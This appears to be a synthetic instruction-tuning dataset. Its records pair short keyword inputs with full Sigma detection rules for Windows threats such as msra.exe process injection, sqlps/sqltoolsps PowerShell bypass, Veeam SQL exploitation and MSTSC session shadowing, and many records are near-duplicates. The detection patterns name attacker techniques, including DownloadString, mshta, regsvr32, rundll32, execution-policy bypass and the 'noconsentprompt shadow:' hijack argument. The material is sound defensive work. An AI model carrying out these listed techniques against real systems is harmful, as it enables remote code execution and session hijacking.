{"instruction": "Write Sigma rule to detect payload:", "input": "\\msra.exe \\arp.exe \\cmd.exe \\net.exe \\netstat.exe \\nslookup.exe \\route.exe \\schtasks.exe \\whoami.exe", "output": "title: Potential Process Injection Via Msra.EXE\nid: 744a188b-0415-4792-896f-11ddb0588dbc\nstatus: test\ndescription: Detects potential process injection via Microsoft Remote Asssistance (Msra.exe) by looking at suspicious child processes spawned from the aforementioned process. It has been a target used by many threat actors and used for discovery and persistence tactics\nreferences:\n    - https://www.microsoft.com/security/blog/2021/12/09/a-closer-look-at-qakbots-latest-building-blocks-and-how-to-knock-them-down/\n    - https://www.fortinet.com/content/dam/fortinet/assets/analyst-reports/ar-qakbot.pdf\nauthor: Alexander McDonald\ndate: 2022-06-24\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\msra.exe'\n        ParentCommandLine|endswith: 'msra.exe'\n        Image|endswith:\n            - '\\arp.exe'\n            - '\\cmd.exe'\n            - '\\net.exe'\n            - '\\netstat.exe'\n            - '\\nslookup.exe'\n            - '\\route.exe'\n            - '\\schtasks.exe'\n            - '\\whoami.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of Msra.exe\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqlps.exe \\sqlps.exe sqlps.exe \\sqlagent.exe", "output": "title: Detection of PowerShell Execution via Sqlps.exe\nid: 0152550d-3a26-4efd-9f0e-54a0b28ae2f3\nstatus: test\ndescription: |\n  This rule detects execution of a PowerShell code through the sqlps.exe utility, which is included in the standard set of utilities supplied with the MSSQL Server.\n  Script blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.\nreferences:\n    - https://learn.microsoft.com/en-us/sql/tools/sqlps-utility?view=sql-server-ver15\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqlps/\n    - https://twitter.com/bryon_/status/975835709587075072\nauthor: 'Agro (@agro_sev) oscd.community'\ndate: 2020-10-10\nmodified: 2022-12-09\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\sqlps.exe'\n    selection_image:\n        - Image|endswith: '\\sqlps.exe'\n        - OriginalFileName: 'sqlps.exe'\n    filter_image:\n        ParentImage|endswith: '\\sqlagent.exe'\n    condition: selection_parent or (selection_image and not filter_image)\nfalsepositives:\n    - Direct PS command execution through SQLPS.exe is uncommon, childprocess sqlps.exe spawned by sqlagent.exe is a legitimate action.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqlps.exe \\sqlps.exe \\\"sqlps.exe\\\" \\sqlagent.exe", "output": "title: Detection of PowerShell Execution via Sqlps.exe\nid: 0152550d-3a26-4efd-9f0e-54a0b28ae2f3\nstatus: test\ndescription: |\n  This rule detects execution of a PowerShell code through the sqlps.exe utility, which is included in the standard set of utilities supplied with the MSSQL Server.\n  Script blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.\nreferences:\n    - https://learn.microsoft.com/en-us/sql/tools/sqlps-utility?view=sql-server-ver15\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqlps/\n    - https://twitter.com/bryon_/status/975835709587075072\nauthor: 'Agro (@agro_sev) oscd.community'\ndate: 2020-10-10\nmodified: 2022-12-09\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\sqlps.exe'\n    selection_image:\n        - Image|endswith: '\\sqlps.exe'\n        - OriginalFileName: 'sqlps.exe'\n    filter_image:\n        ParentImage|endswith: '\\sqlagent.exe'\n    condition: selection_parent or (selection_image and not filter_image)\nfalsepositives:\n    - Direct PS command execution through SQLPS.exe is uncommon, childprocess sqlps.exe spawned by sqlagent.exe is a legitimate action.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqlps \\sqlps sqlps \\sqlagent", "output": "title: Detection of PowerShell Execution via Sqlps.exe\nid: 0152550d-3a26-4efd-9f0e-54a0b28ae2f3\nstatus: test\ndescription: |\n  This rule detects execution of a PowerShell code through the sqlps.exe utility, which is included in the standard set of utilities supplied with the MSSQL Server.\n  Script blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.\nreferences:\n    - https://learn.microsoft.com/en-us/sql/tools/sqlps-utility?view=sql-server-ver15\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqlps/\n    - https://twitter.com/bryon_/status/975835709587075072\nauthor: 'Agro (@agro_sev) oscd.community'\ndate: 2020-10-10\nmodified: 2022-12-09\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\sqlps.exe'\n    selection_image:\n        - Image|endswith: '\\sqlps.exe'\n        - OriginalFileName: 'sqlps.exe'\n    filter_image:\n        ParentImage|endswith: '\\sqlagent.exe'\n    condition: selection_parent or (selection_image and not filter_image)\nfalsepositives:\n    - Direct PS command execution through SQLPS.exe is uncommon, childprocess sqlps.exe spawned by sqlagent.exe is a legitimate action.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqlps.exe \\sqlps.exe \\sqlagent.exe sqlps.exe", "output": "title: Detection of PowerShell Execution via Sqlps.exe\nid: 0152550d-3a26-4efd-9f0e-54a0b28ae2f3\nstatus: test\ndescription: |\n  This rule detects execution of a PowerShell code through the sqlps.exe utility, which is included in the standard set of utilities supplied with the MSSQL Server.\n  Script blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.\nreferences:\n    - https://learn.microsoft.com/en-us/sql/tools/sqlps-utility?view=sql-server-ver15\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqlps/\n    - https://twitter.com/bryon_/status/975835709587075072\nauthor: 'Agro (@agro_sev) oscd.community'\ndate: 2020-10-10\nmodified: 2022-12-09\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\sqlps.exe'\n    selection_image:\n        - Image|endswith: '\\sqlps.exe'\n        - OriginalFileName: 'sqlps.exe'\n    filter_image:\n        ParentImage|endswith: '\\sqlagent.exe'\n    condition: selection_parent or (selection_image and not filter_image)\nfalsepositives:\n    - Direct PS command execution through SQLPS.exe is uncommon, childprocess sqlps.exe spawned by sqlagent.exe is a legitimate action.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqltoolsps.exe \\sqltoolsps.exe \\sqltoolsps.exe \\smss.exe", "output": "title: SQL Client Tools PowerShell Session Detection\nid: a746c9b8-a2fb-4ee5-a428-92bee9e99060\nstatus: test\ndescription: |\n  This rule detects execution of a PowerShell code through the sqltoolsps.exe utility, which is included in the standard set of utilities supplied with the Microsoft SQL Server Management studio.\n  Script blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/8283d8d91552213ded165fd36deb6cb9534cb443/yml/OtherMSBinaries/Sqltoolsps.yml\n    - https://twitter.com/pabraeken/status/993298228840992768\nauthor: 'Agro (@agro_sev) oscd.communitly'\ndate: 2020-10-13\nmodified: 2022-02-25\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\sqltoolsps.exe'\n        - ParentImage|endswith: '\\sqltoolsps.exe'\n        - OriginalFileName: '\\sqltoolsps.exe'\n    filter:\n        ParentImage|endswith: '\\smss.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Direct PS command execution through SQLToolsPS.exe is uncommon, childprocess sqltoolsps.exe spawned by smss.exe is a legitimate action.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\sqltoolsps.exe\\\" \\sqltoolsps.exe \\sqltoolsps.exe \\smss.exe", "output": "title: SQL Client Tools PowerShell Session Detection\nid: a746c9b8-a2fb-4ee5-a428-92bee9e99060\nstatus: test\ndescription: |\n  This rule detects execution of a PowerShell code through the sqltoolsps.exe utility, which is included in the standard set of utilities supplied with the Microsoft SQL Server Management studio.\n  Script blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/8283d8d91552213ded165fd36deb6cb9534cb443/yml/OtherMSBinaries/Sqltoolsps.yml\n    - https://twitter.com/pabraeken/status/993298228840992768\nauthor: 'Agro (@agro_sev) oscd.communitly'\ndate: 2020-10-13\nmodified: 2022-02-25\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\sqltoolsps.exe'\n        - ParentImage|endswith: '\\sqltoolsps.exe'\n        - OriginalFileName: '\\sqltoolsps.exe'\n    filter:\n        ParentImage|endswith: '\\smss.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Direct PS command execution through SQLToolsPS.exe is uncommon, childprocess sqltoolsps.exe spawned by smss.exe is a legitimate action.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqltoolsps \\sqltoolsps \\sqltoolsps \\smss", "output": "title: SQL Client Tools PowerShell Session Detection\nid: a746c9b8-a2fb-4ee5-a428-92bee9e99060\nstatus: test\ndescription: |\n  This rule detects execution of a PowerShell code through the sqltoolsps.exe utility, which is included in the standard set of utilities supplied with the Microsoft SQL Server Management studio.\n  Script blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/8283d8d91552213ded165fd36deb6cb9534cb443/yml/OtherMSBinaries/Sqltoolsps.yml\n    - https://twitter.com/pabraeken/status/993298228840992768\nauthor: 'Agro (@agro_sev) oscd.communitly'\ndate: 2020-10-13\nmodified: 2022-02-25\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\sqltoolsps.exe'\n        - ParentImage|endswith: '\\sqltoolsps.exe'\n        - OriginalFileName: '\\sqltoolsps.exe'\n    filter:\n        ParentImage|endswith: '\\smss.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Direct PS command execution through SQLToolsPS.exe is uncommon, childprocess sqltoolsps.exe spawned by smss.exe is a legitimate action.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqltoolsps.exe \\sqltoolsps.exe \\smss.exe \\sqltoolsps.exe", "output": "title: SQL Client Tools PowerShell Session Detection\nid: a746c9b8-a2fb-4ee5-a428-92bee9e99060\nstatus: test\ndescription: |\n  This rule detects execution of a PowerShell code through the sqltoolsps.exe utility, which is included in the standard set of utilities supplied with the Microsoft SQL Server Management studio.\n  Script blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/8283d8d91552213ded165fd36deb6cb9534cb443/yml/OtherMSBinaries/Sqltoolsps.yml\n    - https://twitter.com/pabraeken/status/993298228840992768\nauthor: 'Agro (@agro_sev) oscd.communitly'\ndate: 2020-10-13\nmodified: 2022-02-25\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\sqltoolsps.exe'\n        - ParentImage|endswith: '\\sqltoolsps.exe'\n        - OriginalFileName: '\\sqltoolsps.exe'\n    filter:\n        ParentImage|endswith: '\\smss.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Direct PS command execution through SQLToolsPS.exe is uncommon, childprocess sqltoolsps.exe spawned by smss.exe is a legitimate action.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqlservr.exe VEEAMSQL \\cmd.exe \\powershell.exe \\pwsh.exe \\wsl.exe \\wt.exe -ex bypass cscript DownloadString http:// https:// mshta regsvr32 rundll32 wscript copy \\net.exe \\net1.exe \\netstat.exe \\nltest.exe \\ping.exe \\tasklist.exe \\whoami.exe", "output": "title: Suspicious Child Process Of Veeam Dabatase\nid: d55b793d-f847-4eea-b59a-5ab09908ac90\nrelated:\n    - id: 869b9ca7-9ea2-4a5a-8325-e80e62f75445\n      type: similar\nstatus: test\ndescription: Detects suspicious child processes of the Veeam service process. This could indicate potential RCE or SQL Injection.\nreferences:\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-04\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\sqlservr.exe'\n        ParentCommandLine|contains: 'VEEAMSQL'\n    selection_child_1:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wsl.exe'\n            - '\\wt.exe'\n        CommandLine|contains:\n            - '-ex '\n            - 'bypass'\n            - 'cscript'\n            - 'DownloadString'\n            - 'http://'\n            - 'https://'\n            - 'mshta'\n            - 'regsvr32'\n            - 'rundll32'\n            - 'wscript'\n            - 'copy '\n    selection_child_2:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\netstat.exe'\n            - '\\nltest.exe'\n            - '\\ping.exe'\n            - '\\tasklist.exe'\n            - '\\whoami.exe'\n    condition: selection_parent and 1 of selection_child_*\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqlservr.exe VEEAMSQL \\cmd.exe \\powershell.exe \\pwsh.exe \\wsl.exe \\wt.exe -ex bypass cscript DownloadString http:// https:// mshta regsvr32 \"rundll32\" wscript copy \\net.exe \\net1.exe \\netstat.exe \\nltest.exe \\ping.exe \\tasklist.exe \\whoami.exe", "output": "title: Suspicious Child Process Of Veeam Dabatase\nid: d55b793d-f847-4eea-b59a-5ab09908ac90\nrelated:\n    - id: 869b9ca7-9ea2-4a5a-8325-e80e62f75445\n      type: similar\nstatus: test\ndescription: Detects suspicious child processes of the Veeam service process. This could indicate potential RCE or SQL Injection.\nreferences:\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-04\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\sqlservr.exe'\n        ParentCommandLine|contains: 'VEEAMSQL'\n    selection_child_1:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wsl.exe'\n            - '\\wt.exe'\n        CommandLine|contains:\n            - '-ex '\n            - 'bypass'\n            - 'cscript'\n            - 'DownloadString'\n            - 'http://'\n            - 'https://'\n            - 'mshta'\n            - 'regsvr32'\n            - 'rundll32'\n            - 'wscript'\n            - 'copy '\n    selection_child_2:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\netstat.exe'\n            - '\\nltest.exe'\n            - '\\ping.exe'\n            - '\\tasklist.exe'\n            - '\\whoami.exe'\n    condition: selection_parent and 1 of selection_child_*\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqlservr VEEAMSQL \\cmd \\powershell \\pwsh \\wsl \\wt -ex bypass cscript DownloadString http:// https:// mshta regsvr32 rundll32 wscript copy \\net \\net1 \\netstat \\nltest \\ping \\tasklist \\whoami", "output": "title: Suspicious Child Process Of Veeam Dabatase\nid: d55b793d-f847-4eea-b59a-5ab09908ac90\nrelated:\n    - id: 869b9ca7-9ea2-4a5a-8325-e80e62f75445\n      type: similar\nstatus: test\ndescription: Detects suspicious child processes of the Veeam service process. This could indicate potential RCE or SQL Injection.\nreferences:\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-04\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\sqlservr.exe'\n        ParentCommandLine|contains: 'VEEAMSQL'\n    selection_child_1:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wsl.exe'\n            - '\\wt.exe'\n        CommandLine|contains:\n            - '-ex '\n            - 'bypass'\n            - 'cscript'\n            - 'DownloadString'\n            - 'http://'\n            - 'https://'\n            - 'mshta'\n            - 'regsvr32'\n            - 'rundll32'\n            - 'wscript'\n            - 'copy '\n    selection_child_2:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\netstat.exe'\n            - '\\nltest.exe'\n            - '\\ping.exe'\n            - '\\tasklist.exe'\n            - '\\whoami.exe'\n    condition: selection_parent and 1 of selection_child_*\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sqlservr.exe VEEAMSQL \\cmd.exe \\powershell.exe \\pwsh.exe \\wsl.exe \\wt.exe -ex bypass cscript DownloadString http:// https:// mshta regsvr32 rundll32 wscript copy \\net.exe \\net1.exe \\netstat.exe \\nltest.exe \\ping.exe \\tasklist.exe \\whoami.exe", "output": "title: Suspicious Child Process Of Veeam Dabatase\nid: d55b793d-f847-4eea-b59a-5ab09908ac90\nrelated:\n    - id: 869b9ca7-9ea2-4a5a-8325-e80e62f75445\n      type: similar\nstatus: test\ndescription: Detects suspicious child processes of the Veeam service process. This could indicate potential RCE or SQL Injection.\nreferences:\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-04\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\sqlservr.exe'\n        ParentCommandLine|contains: 'VEEAMSQL'\n    selection_child_1:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wsl.exe'\n            - '\\wt.exe'\n        CommandLine|contains:\n            - '-ex '\n            - 'bypass'\n            - 'cscript'\n            - 'DownloadString'\n            - 'http://'\n            - 'https://'\n            - 'mshta'\n            - 'regsvr32'\n            - 'rundll32'\n            - 'wscript'\n            - 'copy '\n    selection_child_2:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\netstat.exe'\n            - '\\nltest.exe'\n            - '\\ping.exe'\n            - '\\tasklist.exe'\n            - '\\whoami.exe'\n    condition: selection_parent and 1 of selection_child_*\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "noconsentprompt shadow:", "output": "title: Potential MSTSC Shadowing Activity\nid: 6ba5a05f-b095-4f0a-8654-b825f4f16334\nstatus: test\ndescription: Detects RDP session hijacking by using MSTSC shadowing\nreferences:\n    - https://twitter.com/kmkz_security/status/1220694202301976576\n    - https://github.com/kmkz/Pentesting/blob/47592e5e160d3b86c2024f09ef04ceb87d204995/Post-Exploitation-Cheat-Sheet\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-01-24\nmodified: 2023-02-05\ntags:\n    - attack.lateral-movement\n    - attack.t1563.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'noconsentprompt'\n            - 'shadow:'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "noconsentprompt \"shadow:\"", "output": "title: Potential MSTSC Shadowing Activity\nid: 6ba5a05f-b095-4f0a-8654-b825f4f16334\nstatus: test\ndescription: Detects RDP session hijacking by using MSTSC shadowing\nreferences:\n    - https://twitter.com/kmkz_security/status/1220694202301976576\n    - https://github.com/kmkz/Pentesting/blob/47592e5e160d3b86c2024f09ef04ceb87d204995/Post-Exploitation-Cheat-Sheet\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-01-24\nmodified: 2023-02-05\ntags:\n    - attack.lateral-movement\n    - attack.t1563.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'noconsentprompt'\n            - 'shadow:'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "noconsentprompt shadow:", "output": "title: Potential MSTSC Shadowing Activity\nid: 6ba5a05f-b095-4f0a-8654-b825f4f16334\nstatus: test\ndescription: Detects RDP session hijacking by using MSTSC shadowing\nreferences:\n    - https://twitter.com/kmkz_security/status/1220694202301976576\n    - https://github.com/kmkz/Pentesting/blob/47592e5e160d3b86c2024f09ef04ceb87d204995/Post-Exploitation-Cheat-Sheet\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-01-24\nmodified: 2023-02-05\ntags:\n    - attack.lateral-movement\n    - attack.t1563.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'noconsentprompt'\n            - 'shadow:'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\CCleanerBrowser.exe \\chrome.exe \\chromium.exe \\firefox.exe \\iexplore.exe \\microsoftedge.exe \\msedge.exe \\opera.exe \\vivaldi.exe \\whale.exe \\outlook.exe \\mstsc.exe mstsc.exe", "output": "title: Mstsc.EXE Execution From Uncommon Parent\nid: ff3b6b39-e765-42f9-bb2c-ea6761e0e0f6\nstatus: test\ndescription: Detects potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.\nreferences:\n    - https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/\n    - https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-18\ntags:\n    - attack.lateral-movement\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            # Covers potential downloads/clicks from browsers\n            - '\\brave.exe'\n            - '\\CCleanerBrowser.exe'\n            - '\\chrome.exe'\n            - '\\chromium.exe'\n            - '\\firefox.exe'\n            - '\\iexplore.exe'\n            - '\\microsoftedge.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n            - '\\whale.exe'\n            # Covers potential downloads/clicks from email clients\n            - '\\outlook.exe'\n    selection_img:\n        - Image|endswith: '\\mstsc.exe'\n        - OriginalFileName: 'mstsc.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\CCleanerBrowser.exe \\chrome.exe \\chromium.exe \"\\firefox.exe\" \\iexplore.exe \\microsoftedge.exe \\msedge.exe \\opera.exe \\vivaldi.exe \\whale.exe \\outlook.exe \\mstsc.exe mstsc.exe", "output": "title: Mstsc.EXE Execution From Uncommon Parent\nid: ff3b6b39-e765-42f9-bb2c-ea6761e0e0f6\nstatus: test\ndescription: Detects potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.\nreferences:\n    - https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/\n    - https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-18\ntags:\n    - attack.lateral-movement\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            # Covers potential downloads/clicks from browsers\n            - '\\brave.exe'\n            - '\\CCleanerBrowser.exe'\n            - '\\chrome.exe'\n            - '\\chromium.exe'\n            - '\\firefox.exe'\n            - '\\iexplore.exe'\n            - '\\microsoftedge.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n            - '\\whale.exe'\n            # Covers potential downloads/clicks from email clients\n            - '\\outlook.exe'\n    selection_img:\n        - Image|endswith: '\\mstsc.exe'\n        - OriginalFileName: 'mstsc.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave \\CCleanerBrowser \\chrome \\chromium \\firefox \\iexplore \\microsoftedge \\msedge \\opera \\vivaldi \\whale \\outlook \\mstsc mstsc", "output": "title: Mstsc.EXE Execution From Uncommon Parent\nid: ff3b6b39-e765-42f9-bb2c-ea6761e0e0f6\nstatus: test\ndescription: Detects potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.\nreferences:\n    - https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/\n    - https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-18\ntags:\n    - attack.lateral-movement\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            # Covers potential downloads/clicks from browsers\n            - '\\brave.exe'\n            - '\\CCleanerBrowser.exe'\n            - '\\chrome.exe'\n            - '\\chromium.exe'\n            - '\\firefox.exe'\n            - '\\iexplore.exe'\n            - '\\microsoftedge.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n            - '\\whale.exe'\n            # Covers potential downloads/clicks from email clients\n            - '\\outlook.exe'\n    selection_img:\n        - Image|endswith: '\\mstsc.exe'\n        - OriginalFileName: 'mstsc.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\CCleanerBrowser.exe \\chrome.exe \\chromium.exe \\firefox.exe \\iexplore.exe \\microsoftedge.exe \\msedge.exe \\opera.exe \\vivaldi.exe \\whale.exe \\outlook.exe \\mstsc.exe mstsc.exe", "output": "title: Mstsc.EXE Execution From Uncommon Parent\nid: ff3b6b39-e765-42f9-bb2c-ea6761e0e0f6\nstatus: test\ndescription: Detects potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.\nreferences:\n    - https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/\n    - https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-04-18\ntags:\n    - attack.lateral-movement\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            # Covers potential downloads/clicks from browsers\n            - '\\brave.exe'\n            - '\\CCleanerBrowser.exe'\n            - '\\chrome.exe'\n            - '\\chromium.exe'\n            - '\\firefox.exe'\n            - '\\iexplore.exe'\n            - '\\microsoftedge.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n            - '\\whale.exe'\n            # Covers potential downloads/clicks from email clients\n            - '\\outlook.exe'\n    selection_img:\n        - Image|endswith: '\\mstsc.exe'\n        - OriginalFileName: 'mstsc.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msxsl.exe", "output": "title: Msxsl.EXE Execution\nid: 9e50a8b3-dd05-4eb8-9153-bdb6b79d50b0\nstatus: test\ndescription: |\n    Detects the execution of the MSXSL utility. This can be used to execute Extensible Stylesheet Language (XSL) files. These files are commonly used to describe the processing and rendering of data within XML files.\n    Adversaries can abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019-10-21\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1220\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\msxsl.exe'\n    condition: selection\nfalsepositives:\n    - Msxsl is not installed by default and is deprecated, so unlikely on most systems.\n# Note: If you levreage this utility please consider adding additional filters. As this is looking for \"any\" type of execition\nlevel: medium"}
